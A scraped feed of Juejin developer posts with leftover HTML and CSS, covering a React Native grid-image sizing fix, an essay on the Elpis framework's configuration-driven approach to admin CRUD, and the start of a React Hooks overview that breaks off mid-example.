.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>为了确保图片能够正常显示，最稳妥的方法是使用 <code>Dimensions</code> 计算出精确的图片宽度和高度。</p>
<p>请按照以下步骤修改您的代码：</p>
<ol>
<li>
<p><strong>引入 <code>Dimensions</code></strong>：
在文件顶部的 <code>import</code> 部分添加 <code>Dimensions</code>：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">Dimensions</span>, <span class="hljs-comment">// &lt;--- 添加这一行</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;
</code></pre>
</li>
<li>
<p><strong>计算图片尺寸</strong>：
在 <code>const styles = StyleSheet.create({ ... })</code> <strong>之前</strong>，添加尺寸计算逻辑：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// 计算九宫格图片尺寸</span>
<span class="hljs-keyword">const</span> { <span class="hljs-attr">width</span>: screenWidth } = <span class="hljs-title class_">Dimensions</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'window'</span>);
<span class="hljs-comment">// 屏幕宽度 - section左右padding(32) - postCard左右padding(32) = 内容区域宽度</span>
<span class="hljs-keyword">const</span> contentWidth = screenWidth - <span class="hljs-number">32</span> - <span class="hljs-number">32</span>;
<span class="hljs-comment">// 间距设为内容宽度的 2%</span>
<span class="hljs-keyword">const</span> gap = contentWidth * <span class="hljs-number">0.02</span>;
<span class="hljs-comment">// (总宽度 - 2个间距) / 3 = 单张图片宽度</span>
<span class="hljs-keyword">const</span> imageSize = (contentWidth - gap * <span class="hljs-number">2</span>) / <span class="hljs-number">3</span>;
</code></pre>
</li>
<li>
<p><strong>更新 <code>gridImage</code> 样式</strong>：
将 <code>styles</code> 中的 <code>gridImage</code> 修改为使用计算出的固定宽高，并将 <code>imagesContainer</code> 的 <code>flexWrap</code> 属性确保设置正确：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> styles = <span class="hljs-title class_">StyleSheet</span>.<span class="hljs-title function_">create</span>({
  <span class="hljs-comment">// ... 其他样式保持不变 ...</span>
  
  <span class="hljs-attr">imagesContainer</span>: { 
    <span class="hljs-attr">flexDirection</span>: <span class="hljs-string">'row'</span>, 
    <span class="hljs-attr">flexWrap</span>: <span class="hljs-string">'wrap'</span>, 
    <span class="hljs-attr">marginBottom</span>: <span class="hljs-number">8</span> 
  },
  <span class="hljs-attr">singleImage</span>: { 
    <span class="hljs-attr">width</span>: <span class="hljs-string">'100%'</span>, 
    <span class="hljs-attr">height</span>: <span class="hljs-number">180</span>, 
    <span class="hljs-attr">borderRadius</span>: <span class="hljs-number">8</span> 
  },
  <span class="hljs-attr">gridImage</span>: { 
    <span class="hljs-attr">width</span>: imageSize, 
    <span class="hljs-attr">height</span>: imageSize, <span class="hljs-comment">// 明确指定高度</span>
    <span class="hljs-attr">borderRadius</span>: <span class="hljs-number">8</span>, 
    <span class="hljs-attr">marginBottom</span>: <span class="hljs-number">8</span>, 
    <span class="hljs-attr">marginRight</span>: gap <span class="hljs-comment">// 使用计算出的间距</span>
  },
  
  <span class="hljs-comment">// ... 其他样式保持不变 ...</span>
});
</code></pre>
</li>
<li>
<p><strong>检查渲染逻辑中的间距处理</strong>：</p>
<pre><code class="hljs language-tsx" lang="tsx">style={[
  styles.<span class="hljs-property">gridImage</span>,
  (idx + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span> === <span class="hljs-number">0</span> &amp;&amp; { <span class="hljs-attr">marginRight</span>: <span class="hljs-number">0</span> }
]}
</code></pre>
</li>
</ol>
<p>这样修改后，每张图片都会有明确的宽度和高度，就能正常显示了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[摆脱重复劳动的引力：深入解析 Elpis 框架的“配置驱动”哲学]]></title>    <link>https://juejin.cn/post/7594350054090506282</link>    <guid>https://juejin.cn/post/7594350054090506282</guid>    <pubDate>2026-01-12T13:35:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054090506282" data-draft-id="7593595780221730822" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="摆脱重复劳动的引力：深入解析 Elpis 框架的“配置驱动”哲学"/> <meta itemprop="keywords" content="全栈"/> <meta itemprop="datePublished" content="2026-01-12T13:35:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="飞雪飘摇"/> <meta itemprop="url" content="https://juejin.cn/user/1381417899276664"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            摆脱重复劳动的引力：深入解析 Elpis 框架的“配置驱动”哲学
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1381417899276664/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    飞雪飘摇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T13:35:12.000Z" title="Mon Jan 12 2026 13:35:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<blockquote>
<p>本文为阶段性学习笔记，主要记录学习过程中的业务架构设计部分——深入解析 Elpis 如何通过 DSL（配置驱动） 与 Schema 设计，从根本上解决中后台开发中重复 CRUD 的痛点。
引用： 抖音“哲玄前端”《大前端全栈实践》</p>
</blockquote>
<h2 data-id="heading-1">1. 困境：被 CRUD 吞噬的创造力</h2>
<p>在当今的前端开发领域，尽管技术栈日新月异，但对于中后台系统而言，绝大多数开发者的日常依然被困在重复的 CRUD（增删改查）泥潭中。我们在做一个页面时，往往陷入这样的循环：后端定义数据表，前端编写查询接口；前端写一个搜索栏，再写一个表格，最后写几个弹窗。一旦业务变更，比如“商品名称”字段需要支持模糊搜索，我们需要同时修改后端 SQL、API 接口、前端搜索组件、前端表格列定义……这种“散弹式”的开发模式，不仅让代码充满了大量雷同的逻辑，更让系统的维护成本随着功能增加而指数级上升。我们不仅在写重复的代码，更在生产“技术负债”。Elpis 框架的诞生，正是为了打破这一僵局。它不只是一个开发工具，更是一种“80% 配置化 + 20% 定制化”的思维范式转型，旨在让开发者从“代码搬运工”回归到“业务设计者”的角色 —— 七分构想，三分实现。</p>
<h2 data-id="heading-2">2. 核心解法：AOP 领域模型的重塑</h2>
<p>传统开发中，一个业务实体（比如“商品”）被割裂在数据库、后端代码、前端 UI 等多个角落。Elpis 引入了 AOP（面向切面） 的领域模型思想，将业务的本质重新聚合。</p>
<h3 data-id="heading-3">单一事实来源</h3>
<p>在 Elpis 的设计中，我们不再分别编写“搜索表单的代码”和“表格展示的代码”。相反，我们只需在一个统一的领域模型配置文件（DSL）中定义“商品”这个对象。在这个模型中，针对每一个字段（例如“创建时间”），我们可以在同一个地方定义它的所有切面属性：</p>
<ul>
<li>数据属性：它是一个日期类型。</li>
</ul>

<ul>
<li>展示切面：在表格中，它需要被格式化展示，列宽多少。</li>
</ul>

<ul>
<li>交互切面：在搜索栏中，它应该自动渲染为一个“日期范围选择器”。</li>
</ul>

<ul>
<li>持久化切面：(扩展能力) 在数据库中，它对应什么类型的列。</li>
</ul>
<p>这种高内聚的设计意味着，当你需要修改业务逻辑时，只需修改这一处配置，系统中的搜索、列表、甚至后端校验逻辑都会自动同步更新。</p>
<h2 data-id="heading-4">3. 引擎之心：面向对象建站与动态渲染</h2>
<p>有了领域模型这个“蓝图”，还需要一个强大的“施工队”将其变为现实。这就是 Elpis 的动态渲染引擎。</p>
<h3 data-id="heading-5">智能解析与分发</h3>
<p>Elpis 的内核包含一套智能解析机制。当页面加载时，引擎会读取上述的领域模型配置，并像棱镜一样将其拆解：</p>
<ul>
<li>它提取出标记了“搜索属性”的字段，输送给搜索栏渲染器。</li>
</ul>

<ul>
<li>它提取出标记了“展示属性”的字段，输送给表格渲染器。</li>
</ul>
<p>这一过程对开发者是透明的。你不需要关心组件之间如何传递数据，引擎会自动处理好上下文的关联。</p>
<h3 data-id="heading-6">组件即对象</h3>
<p>在 Elpis 中，我们不再手动编写具体的标签，例如Input。框架采用组件工厂模式，根据配置中的字段类型，自动生产对应的 UI 组件。例如，当你在配置中指定某个字段需要“下拉选择”且数据来源是某个 API 时，Elpis 会自动加载一个动态下拉组件。这个组件拥有独立的生命周期，会自动发起网络请求获取选项数据，自动处理回显和重置。这就是“面向对象建站”的精髓——每个组件都是一个智能的、可复用的对象，而非死板的 HTML 标签堆砌。</p>
<h2 data-id="heading-7">4. 约定优于配置：RESTful 的自动化契约</h2>
<p>为了进一步减少“胶水代码”，Elpis 建立了一套基于 RESTful 规范的标准交互契约。在传统的后台开发中，我们即使使用了组件库，依然需要手动编写函数去处理“点击搜索按钮”、“点击删除按钮”等事件，并手动调用 API。而在 Elpis 中，由于遵循了标准规范，引擎接管了这些通用交互：</p>
<ul>
<li>自动查询：列表组件会自动拼接查询参数和分页信息，向约定的 /list 接口发起请求。</li>
</ul>

<ul>
<li>自动交互：当你配置了“删除”按钮，引擎自动理解这意味着要调用 DELETE 接口，并自动处理二次确认弹窗、加载状态提示以及操作成功后的列表刷新。</li>
</ul>
<p>开发者只需要在配置中声明“这里需要一个删除按钮”，剩下的交互细节全部由框架内核自动完成。</p>
<h2 data-id="heading-8">5. 结语：从“执行者”到“设计者”</h2>
<p>Elpis 框架并没有创造什么惊天动地的新技术，而是对现有工程实践进行了一次深度的标准化封装。通过 DSL（领域特定语言），我们固化了后台管理系统中最常见的交互范式；通过 AOP 模型，我们解决了业务逻辑碎片化的问题。对于使用 Elpis 的开发者而言，这意味着你不再需要纠结于“表格怎么对齐”、“接口参数要不要判空”这些琐碎的技术细节。你被赋予了更多的时间去思考业务本身：这个字段真正的业务含义是什么？各个数据实体之间是什么关系？这才是 Elpis 想要达到的终极目标：让技术隐于无形，让业务回归本质。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Hooks 介绍与实践要点]]></title>    <link>https://juejin.cn/post/7594309641866575910</link>    <guid>https://juejin.cn/post/7594309641866575910</guid>    <pubDate>2026-01-12T13:59:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594309641866575910" data-draft-id="7594282984326447113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Hooks 介绍与实践要点"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-12T13:59:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="React_Native"/> <meta itemprop="url" content="https://juejin.cn/user/2496332659980452"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Hooks 介绍与实践要点
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2496332659980452/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    React_Native
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T13:59:49.000Z" title="Mon Jan 12 2026 13:59:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React Hooks 介绍与实践要点</h2>
<p>本文面向日常业务开发，聚焦 <strong>核心 Hooks</strong> 与 <strong>典型场景 Hooks</strong>，并补充常见的数据请求方案（SWR / React Query）、浏览器渲染过程与 <code>useEffect</code> / <code>useLayoutEffect</code> 的关系，最后简要介绍 Redux 与 React Navigation 常用 Hooks。</p>
<hr/>
<h3 data-id="heading-1">核心 Hooks</h3>
<h4 data-id="heading-2">useState：组件内状态</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);
</code></pre>
<ul>
<li><strong>更新判定</strong>：React 使用 <code>Object.is</code> 比较新旧 state，只有“不相等”才会触发更新（这也是为什么“设置相同值”通常不会 re-render）。</li>
<li><strong><code>Object.is</code> 的两个关键差异点</strong>（相对 <code>===</code>）：
<ul>
<li><strong><code>NaN</code></strong>：<code>Object.is(NaN, NaN)</code> 为 <code>true</code>，而 <code>NaN === NaN</code> 为 <code>false</code></li>
<li><strong><code>+0</code> 与 <code>-0</code></strong>：<code>Object.is(+0, -0)</code> 为 <code>false</code>，而 <code>+0 === -0</code> 为 <code>true</code></li>
</ul>
</li>
</ul>
<p>实践建议：</p>
<ul>
<li><strong>状态是对象/数组时</strong>，务必用“新引用”更新（不可原地修改），否则 <code>Object.is</code> 会认为没变（同一引用）而不触发更新。</li>
</ul>
<hr/>
<h4 data-id="heading-3">useEffect：提交渲染后异步执行副作用</h4>
<p><code>useEffect</code> 会在 React <strong>完成渲染并提交 DOM 更新之后</strong> 异步执行，通常不会阻塞浏览器绘制（paint），适合：</p>
<ul>
<li><strong>数据请求</strong>、订阅、日志/埋点（不依赖布局测量）、与非阻塞型副作用</li>
</ul>
<p>依赖数组要点：</p>
<ul>
<li><strong>依赖缺失</strong>可能导致使用到“旧闭包值”（stale closure）</li>
<li><strong>依赖过多</strong>容易引发重复请求或循环触发，需要拆分 effect 或改用更高层的数据方案（SWR / React Query）</li>
</ul>
<hr/>
<h4 data-id="heading-4">useRef：引用不参与渲染的可变值 / DOM 引用</h4>
<ul>
<li><strong>典型用途</strong>：
<ul>
<li>保存不会引起 re-render 的值（如计时器 id、上一次值、可变标记）</li>
<li>获取 DOM/原生组件实例（需要时进行测量、聚焦等）</li>
</ul>
</li>
<li><strong>关于传递 ref</strong>：
<ul>
<li>React 18：子组件要“透传 ref”通常需要 <code>forwardRef</code></li>
<li>React 19：ref 支持作为普通 prop 传递（生态在逐步适配），但仍需关注组件实现是否接收并正确挂载到目标节点</li>
</ul>
</li>
</ul>
<hr/>
<h4 data-id="heading-5">useImperativeHandle：受控暴露子组件能力（配合 ref）</h4>
<p>当你希望父组件通过 ref 调用子组件能力（如 <code>focus()</code>、<code>scrollTo()</code>），但又不想把子组件内部实现（真实 DOM/实例）完全暴露出去时，可以用 <code>useImperativeHandle</code> 做“白名单式暴露”：</p>
<ul>
<li>对外只暴露必要方法/属性</li>
<li>对内仍保留组件封装边界</li>
</ul>
<p>通常与 <code>forwardRef</code>（React 18 常见用法）或 React 19 的 ref 语义配合。</p>
<hr/>
<h4 data-id="heading-6">useReducer：更可控的状态演进（适合复杂状态）</h4>
<p>当 state 结构复杂、更新逻辑分支多、或者需要更强可测试性时，<code>useReducer</code> 往往比多个 <code>useState</code> 更清晰：</p>
<ul>
<li><strong>把更新逻辑集中到 reducer</strong>，避免散落在各个事件处理里</li>
<li><strong>更利于维护与单测</strong>（输入 action，输出新 state）</li>
</ul>
<hr/>
<h4 data-id="heading-7">useContext：跨层级共享状态与依赖注入</h4>
<p><code>useContext</code> 用于订阅 context 值，适合：</p>
<ul>
<li>主题、语言、用户信息、权限、配置、依赖注入（API 客户端等）</li>
</ul>
<p>注意点：</p>
<ul>
<li><strong>Context 值变化会触发所有消费组件更新</strong>。若 context 对象频繁变化，可考虑：
<ul>
<li>拆分 context（按关注点拆）</li>
<li>提供稳定引用（<code>useMemo</code> 包裹 value）</li>
<li>引入 selector 模式或外部状态库</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-8">数据请求：useEffect vs SWR / React Query</h3>
<h4 data-id="heading-9">直接用 useEffect 的局限</h4>
<p>用 <code>useEffect</code> 做请求通常意味着你需要自行处理：</p>
<ul>
<li><strong>loading / error / data</strong> 的状态机</li>
<li><strong>缓存</strong>（组件卸载再挂载通常会重新请求）</li>
<li><strong>自动刷新 / 重试 / 失焦恢复</strong> 等策略</li>
<li><strong>复杂依赖管理</strong>：依赖多时容易遗漏依赖数组、或触发循环请求</li>
</ul>
<h4 data-id="heading-10">SWR / React Query（TanStack Query）</h4>
<p>它们把“请求”升级为“客户端数据层”，提供：</p>
<ul>
<li><strong>缓存与去重</strong>：相同 key 的请求能共享结果</li>
<li><strong>自动重试、失焦恢复、刷新策略</strong></li>
<li><strong>更好的并发与竞态控制</strong>（避免过期请求覆盖新结果）</li>
</ul>
<p>React Query 相对 SWR 往往更“全能”：</p>
<ul>
<li>更成熟的 <strong>分页 / 无限滚动</strong> 能力</li>
<li>更复杂的依赖联动与查询控制（例如 <code>enabled</code>、query key 组合）</li>
</ul>
<h4 data-id="heading-11">依赖数据联动（Dependent Queries）：先有 A 再请求 B</h4>
<p>很多业务请求不是“并行独立”的，而是 <strong>后一个请求依赖前一个请求的结果</strong>（例如：先拿用户信息，再用 userId 拉订单）。如果用 <code>useEffect</code> 手写，常见问题是：</p>
<ul>
<li>依赖判断散落在多个 effect 里，容易漏依赖或出现重复请求</li>
<li>前后请求的 loading/error 状态难以组合</li>
<li>竞态条件（旧请求返回覆盖新请求）需要额外处理</li>
</ul>
<p>React Query 通常用 <strong>queryKey + enabled</strong> 表达“依赖准备好才发请求”：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> { <span class="hljs-attr">data</span>: users } = <span class="hljs-title function_">useQuery</span>({
  <span class="hljs-attr">queryKey</span>: [<span class="hljs-string">'users'</span>],
